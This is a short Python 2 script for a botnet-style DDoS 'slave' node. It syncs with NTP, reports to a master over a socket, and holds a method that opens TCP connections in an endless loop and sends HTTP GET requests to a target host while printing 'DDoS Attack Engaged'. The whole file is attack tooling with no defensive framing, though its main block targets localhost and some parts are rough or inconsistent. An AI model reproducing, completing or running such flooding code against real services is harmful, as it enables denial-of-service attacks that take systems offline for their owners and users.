#!/usr/bin/python
import time, os, sys, string, ntplib
from socket import *  #importing the socket library for network connections
from time import ctime

class Slave():
    def __init__(self, host, port, sock=None):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message='asdf'
        conn=input("How many connections do you want to make: ")
        ip = gethostbyname(self.host)
        self.num_connections = 0

        # get ntp times
        ntpc = ntplib.NTPClient()
        ntp_res = ntpc.request('europe.pool.ntp.org', version=3)

        # connect to master
        self.masterHost = 'localhost'
        self.masterPort = 8081
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send('Slave offset is: {0}'.format(ntp_res.offset))

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64)
        if len(msg_buf) > 0:
          print(msg_buf)

    def doTheDos(self, host, port):
        while 1:
            self.dos(host, port)

    def dos(self, host, port):
        try:
            self.ddos = socket(AF_INET, SOCK_STREAM)
            self.ddos.connect((host, port))
            self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
        except error, msg:
            self.num_connections = self.num_connections+1
            print("|[Connection Failed] | %d", self.num_connections )
        print ("|[DDoS Attack Engaged] |")
        #ddos.close()

if __name__ == '__main__':
  slaveNode = Slave('localhost', 8080)

  while(1):
#for i in xrange(conn):
    #slaveNode.dos()
    slaveNode.acceptMessages()
